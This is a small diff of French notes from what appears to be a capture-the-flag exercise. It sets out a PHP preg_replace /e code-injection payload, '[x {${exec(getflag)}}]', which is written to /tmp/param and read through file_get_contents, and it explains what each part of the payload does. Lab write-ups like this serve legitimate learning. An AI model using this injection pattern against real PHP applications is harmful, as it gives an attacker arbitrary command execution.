@@ -1,7 +1,7 @@
-[x {${exec(getflag)}}]
+echo '[x {${exec(getflag)}}]' > /tmp/param
 
 - on veut executer exec(getflag)
 - ${ ... } pour executer
-- { ... } pour aller cherche la variable pour afficher le resultat
-- [x ...] poour activer preg_replace
+- { ... } pour aller chercher la variable pour afficher le resultat
+- [x ...] pour activer preg_replace
 - le tout dans un fichier pour utiliser flag_get_contents
